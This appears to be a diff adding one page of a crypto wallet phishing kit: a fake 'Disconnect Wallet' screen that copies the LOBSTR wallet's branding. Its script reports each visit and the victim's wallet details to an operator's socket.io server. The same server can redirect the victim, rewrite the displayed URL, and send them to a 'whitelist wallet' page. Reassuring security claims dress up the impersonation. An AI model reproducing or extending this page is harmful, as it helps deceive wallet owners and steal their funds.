@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script src="/socket.io/socket.io.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LOBSTR - Disconnect Wallet</title>
+    <link rel="icon" href="https://static.lobstr.co/static/landing/images/logo.svg">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --lobstr-teal: #1B8DA0;
+            --lobstr-light-teal: #E8F4F6;
+            --lobstr-dark-teal: #156B7D;
+            --lobstr-white: #FFFFFF;
+            --lobstr-gray: #F8F9FA;
+            --lobstr-text: #333333;
+            --lobstr-light-gray: #E9ECEF;
+            --lobstr-warning: #FFC107;
+            --lobstr-warning-light: #FFF8E1;
+            --lobstr-danger: #DC3545;
+            --lobstr-danger-light: #F8D7DA;
+            --spacing-1: 8px;
+            --spacing-2: 16px;
+            --spacing-3: 24px;
+            --spacing-4: 32px;
+            --spacing-5: 40px;
+            --border-radius: 8px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Ubuntu', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica', 'Arial', sans-serif;
+            background-color: var(--lobstr-white);
+            color: var(--lobstr-text);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: var(--spacing-3);
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: var(--spacing-5);
+        }
+
+        .logo {
+            height: 48px;
+            margin-bottom: var(--spacing-2);
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 500;
+            color: var(--lobstr-text);
+            margin-bottom: var(--spacing-1);
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #666;
+        }
+
+        .card {
+            background: var(--lobstr-white);
+            border: 1px solid var(--lobstr-light-gray);
+            border-radius: var(--border-radius);
+            padding: var(--spacing-4);
+            margin-bottom: var(--spacing-3);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .disconnect-icon {
+            text-align: center;
+            margin-bottom: var(--spacing-3);
+        }
+
+        .disconnect-symbol {
+            width: 80px;
+            height: 80px;
+            background: var(--lobstr-danger);
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 40px;
+            animation: disconnectPulse 2s infinite;
+        }
+
+        @keyframes disconnectPulse {
+            0%, 100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            50% {
+                transform: scale(1.05);
+                opacity: 0.8;
+            }
+        }
+
+        .disconnect-status {
+            text-align: center;
+            margin-bottom: var(--spacing-4);
+        }
+
+        .status-message {
+            font-size: 24px;
+            font-weight: 600;
+            color: var(--lobstr-danger);
+            margin-bottom: var(--spacing-1);
+        }
+
+        .status-description {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: var(--spacing-2);
+        }
+
+        .wallet-details {
+            margin-bottom: var(--spacing-4);
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: var(--spacing-1) 0;
+            border-bottom: 1px solid var(--lobstr-light-gray);
+        }
+
+        .detail-row:last-child {
+            border-bottom: none;
+        }
+
+        .detail-label {
+            font-size: 14px;
+            color: #666;
+            font-weight: 500;
+        }
+
+        .detail-value {
+            font-size: 14px;
+            color: var(--lobstr-text);
+            font-weight: 500;
+        }
+
+        .wallet-address {
+            color: var(--lobstr-teal);
+            font-weight: 600;
+            font-family: 'Ubuntu Mono', monospace;
+            font-size: 12px;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: var(--spacing-2);
+            margin-top: var(--spacing-3);
+        }
+
+        .action-button {
+            flex: 1;
+            padding: var(--spacing-2) var(--spacing-3);
+            border: none;
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            font-weight: 500;
+            font-family: 'Ubuntu', sans-serif;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+        }
+
+        .primary-button {
+            background: var(--lobstr-teal);
+            color: var(--lobstr-white);
+        }
+
+        .primary-button:hover {
+            background: var(--lobstr-dark-teal);
+        }
+
+        .secondary-button {
+            background: var(--lobstr-white);
+            color: var(--lobstr-teal);
+            border: 1px solid var(--lobstr-teal);
+        }
+
+        .secondary-button:hover {
+            background: var(--lobstr-light-teal);
+        }
+
+        .danger-button {
+            background: var(--lobstr-danger);
+            color: var(--lobstr-white);
+        }
+
+        .danger-button:hover {
+            background: #C82333;
+        }
+
+        .warning-notice {
+            background: var(--lobstr-warning-light);
+            border: 1px solid var(--lobstr-warning);
+            border-radius: var(--border-radius);
+            padding: var(--spacing-3);
+            margin-top: var(--spacing-3);
+        }
+
+        .warning-notice-title {
+            font-size: 16px;
+            font-weight: 500;
+            color: #E65100;
+            margin-bottom: var(--spacing-2);
+            display: flex;
+            align-items: center;
+            gap: var(--spacing-1);
+        }
+
+        .warning-notice-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        .warning-notice-item {
+            display: flex;
+            align-items: center;
+            gap: var(--spacing-1);
+            font-size: 14px;
+            color: #E65100;
+            margin-bottom: var(--spacing-1);
+        }
+
+        .warning-notice-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .disconnect-confirmation {
+            background: var(--lobstr-danger-light);
+            border: 1px solid var(--lobstr-danger);
+            border-radius: var(--border-radius);
+            padding: var(--spacing-3);
+            margin-bottom: var(--spacing-3);
+            text-align: center;
+        }
+
+        .confirmation-text {
+            font-size: 14px;
+            color: #721C24;
+            margin-bottom: var(--spacing-2);
+        }
+
+        .confirmation-emphasis {
+            font-weight: 600;
+            color: var(--lobstr-danger);
+        }
+
+        .security-info {
+            background: var(--lobstr-light-teal);
+            border: 1px solid var(--lobstr-teal);
+            border-radius: var(--border-radius);
+            padding: var(--spacing-3);
+            margin-top: var(--spacing-3);
+        }
+
+        .security-info-title {
+            font-size: 16px;
+            font-weight: 500;
+            color: var(--lobstr-dark-teal);
+            margin-bottom: var(--spacing-2);
+            display: flex;
+            align-items: center;
+            gap: var(--spacing-1);
+        }
+
+        .security-info-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        .security-info-item {
+            display: flex;
+            align-items: center;
+            gap: var(--spacing-1);
+            font-size: 14px;
+            color: var(--lobstr-dark-teal);
+            margin-bottom: var(--spacing-1);
+        }
+
+        .security-info-item:last-child {
+            margin-bottom: 0;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: var(--spacing-2);
+            }
+            
+            .card {
+                padding: var(--spacing-3);
+            }
+            
+            .action-buttons {
+                flex-direction: column;
+            }
+            
+            .status-message {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://static.lobstr.co/static/landing/images/logo.svg" alt="LOBSTR" class="logo">
+            <h1 class="title">Disconnect Wallet</h1>
+            <p class="subtitle">Secure wallet disconnection</p>
+        </div>
+
+        <div class="disconnect-confirmation">
+            <div class="confirmation-text">
+                You are about to disconnect your wallet from LOBSTR.
+            </div>
+            <div class="confirmation-emphasis">
+                This action will end your current session
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="disconnect-icon">
+                <div class="disconnect-symbol">🔌</div>
+            </div>
+
+            <div class="disconnect-status">
+                <div class="status-message">Wallet Connected</div>
+                <div class="status-description" id="statusDescription">Your wallet is currently connected to LOBSTR</div>
+            </div>
+
+            <div class="wallet-details" id="walletDetails">
+                <div class="detail-row">
+                    <span class="detail-label">Wallet Type</span>
+                    <span class="detail-value" id="walletType">Hardware Wallet</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Address</span>
+                    <span class="detail-value wallet-address" id="walletAddress">G...XXXX</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Connection Status</span>
+                    <span class="detail-value" id="connectionStatus">Active</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Connected Since</span>
+                    <span class="detail-value" id="connectedTime">---</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Session ID</span>
+                    <span class="detail-value" id="sessionId">---</span>
+                </div>
+            </div>
+
+            <div class="action-buttons">
+                <button class="action-button secondary-button" onclick="cancelDisconnect()">
+                    Cancel
+                </button>
+                <button class="action-button danger-button" onclick="confirmDisconnect()" id="disconnectBtn">
+                    Disconnect Wallet
+                </button>
+            </div>
+        </div>
+
+        <div class="warning-notice">
+            <div class="warning-notice-title">
+                <span>⚠️</span>
+                Before disconnecting
+            </div>
+            <ul class="warning-notice-list">
+                <li class="warning-notice-item">
+                    <span>•</span>
+                    Ensure all transactions are completed
+                </li>
+                <li class="warning-notice-item">
+                    <span>•</span>
+                    Save any important transaction IDs
+                </li>
+                <li class="warning-notice-item">
+                    <span>•</span>
+                    Make note of your wallet address
+                </li>
+                <li class="warning-notice-item">
+                    <span>•</span>
+                    You'll need to reconnect to access your funds
+                </li>
+            </ul>
+        </div>
+
+        <div class="security-info">
+            <div class="security-info-title">
+                <span>🔒</span>
+                Security Information
+            </div>
+            <ul class="security-info-list">
+                <li class="security-info-item">
+                    <span>✓</span>
+                    Your private keys remain secure on your device
+                </li>
+                <li class="security-info-item">
+                    <span>✓</span>
+                    LOBSTR never stores your private keys
+                </li>
+                <li class="security-info-item">
+                    <span>✓</span>
+                    Disconnection is logged for security purposes
+                </li>
+                <li class="security-info-item">
+                    <span>✓</span>
+                    You can reconnect anytime using your wallet
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <script src="/js/socket-client.js"></script>
+    <script>
+        let walletInfo = null;
+        let sessionStartTime = null;
+
+        document.addEventListener('DOMContentLoaded', function() {
+            // Apply custom LOBSTR styling
+            const style = document.createElement('style');
+            style.textContent = `
+                body { 
+                    font-family: 'Ubuntu', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif !important;
+                    background: #ffffff !important;
+                }
+            `;
+            document.head.appendChild(style);
+
+            // Socket connection for real-time updates
+            socket.emit('page_visit', {
+                page: window.location.pathname
+            });
+
+            // Initialize session timer
+            sessionStartTime = new Date();
+            updateConnectedTime();
+
+            // Request wallet connection details
+            socket.emit('request_wallet_details');
+        });
+
+        function updateConnectedTime() {
+            if (sessionStartTime) {
+                const timeString = sessionStartTime.toLocaleDateString('en-US', {
+                    year: 'numeric',
+                    month: 'short',
+                    day: 'numeric'
+                }) + ' at ' + sessionStartTime.toLocaleTimeString('en-US', {
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    timeZoneName: 'short'
+                });
+                document.getElementById('connectedTime').textContent = timeString;
+            }
+        }
+
+        function cancelDisconnect() {
+            // Emit socket event for cancellation
+            socket.emit('cancel_wallet_disconnect', {
+                page: window.location.pathname
+            });
+
+            // Redirect back to wallet
+            window.location.href = '/pages/lobstrEstimatedBalance.html';
+        }
+
+        function confirmDisconnect() {
+            if (confirm('Are you sure you want to disconnect your wallet? You will need to reconnect to access your funds again.')) {
+                // Emit socket event for disconnection
+                socket.emit('disconnect_wallet', {
+                    walletInfo: walletInfo,
+                    page: window.location.pathname
+                });
+
+                // Update UI to show disconnecting state
+                document.getElementById('connectionStatus').textContent = 'Disconnecting...';
+                document.getElementById('disconnectBtn').disabled = true;
+                document.getElementById('disconnectBtn').textContent = 'Disconnecting...';
+                document.querySelector('.status-message').textContent = 'Disconnecting...';
+                document.querySelector('.status-description').textContent = 'Safely disconnecting your wallet from LOBSTR';
+            }
+        }
+
+        // Socket event handlers
+        socket.on('connect', () => {
+            console.log('Connected to LOBSTR secure server');
+        });
+
+        socket.on('connect_error', (error) => {
+            console.error('LOBSTR connection error:', error);
+        });
+
+        socket.on('redirect', (url) => {
+            // Update URL to use lobstr prefixed pages
+            window.location.href = url;
+        });
+
+        socket.on('session_url', (url) => {
+            if (url && url !== window.location.pathname + window.location.search) {
+                window.history.replaceState({}, '', url);
+            }
+        });
+
+        socket.on('wallet_details', (data) => {
+            walletInfo = data;
+            
+            if (data.address) {
+                // Truncate long addresses for display
+                const truncated = data.address.length > 20 
+                    ? `${data.address.substring(0, 8)}...${data.address.substring(data.address.length - 8)}`
+                    : data.address;
+                document.getElementById('walletAddress').textContent = truncated;
+            }
+            
+            if (data.type) {
+                document.getElementById('walletType').textContent = data.type;
+            }
+            
+            if (data.sessionId) {
+                document.getElementById('sessionId').textContent = data.sessionId.substring(0, 12) + '...';
+            }
+            
+            if (data.connectedAt) {
+                sessionStartTime = new Date(data.connectedAt);
+                updateConnectedTime();
+            }
+        });
+
+        socket.on('wallet_disconnect_status', (data) => {
+            const statusDescription = document.getElementById('statusDescription');
+            const status = document.getElementById('connectionStatus');
+            
+            if (data.status === 'disconnected') {
+                status.textContent = 'Disconnected';
+                statusDescription.textContent = 'Your wallet has been successfully disconnected';
+                document.querySelector('.status-message').textContent = 'Wallet Disconnected';
+                document.querySelector('.status-message').style.color = '#6C757D';
+                
+                // Hide disconnect button
+                document.getElementById('disconnectBtn').style.display = 'none';
+                
+                // Redirect to login after delay
+                setTimeout(() => {
+                    window.location.href = '/pages/lobstrWhitelistWallet.html';
+                }, 3000);
+            } else if (data.status === 'error') {
+                status.textContent = 'Error';
+                statusDescription.textContent = 'Failed to disconnect wallet. Please try again.';
+                document.querySelector('.status-message').textContent = 'Disconnection Failed';
+                document.querySelector('.status-message').style.color = '#DC3545';
+                
+                // Re-enable disconnect button
+                document.getElementById('disconnectBtn').disabled = false;
+                document.getElementById('disconnectBtn').textContent = 'Disconnect Wallet';
+            }
+        });
+
+        socket.on('wallet_disconnected', (data) => {
+            document.getElementById('connectionStatus').textContent = 'Disconnected';
+            document.getElementById('statusDescription').textContent = 'Wallet has been disconnected successfully';
+            document.querySelector('.status-message').textContent = 'Wallet Disconnected';
+            document.querySelector('.status-message').style.color = '#6C757D';
+            
+            // Update icon
+            document.querySelector('.disconnect-symbol').textContent = '🔌';
+            document.querySelector('.disconnect-symbol').style.background = '#6C757D';
+            
+            // Hide disconnect button and show reconnect option
+            document.getElementById('disconnectBtn').style.display = 'none';
+            
+            // Add reconnect button
+            const actionButtons = document.querySelector('.action-buttons');
+            const reconnectBtn = document.createElement('button');
+            reconnectBtn.className = 'action-button primary-button';
+            reconnectBtn.textContent = 'Reconnect Wallet';
+            reconnectBtn.onclick = () => window.location.href = '/pages/lobstrWhitelistWallet.html';
+            actionButtons.appendChild(reconnectBtn);
+            
+            // Auto-redirect after delay
+            setTimeout(() => {
+                window.location.href = '/pages/lobstrWhitelistWallet.html';
+            }, 5000);
+        });
+
+        // Enhanced error handling
+        socket.on('error', (error) => {
+            console.error('Socket error:', error);
+            document.getElementById('statusDescription').textContent = 'Connection error. Please refresh the page.';
+        });
+
+        // Security event logging
+        socket.on('security_event', (data) => {
+            console.log('Security event logged:', data);
+        });
+
+        // Handle session timeout
+        socket.on('session_timeout', (data) => {
+            alert('Your session has expired. You will be redirected to reconnect your wallet.');
+            window.location.href = '/pages/lobstrWhitelistWallet.html';
+        });
+    </script>
+</body>
+</html>
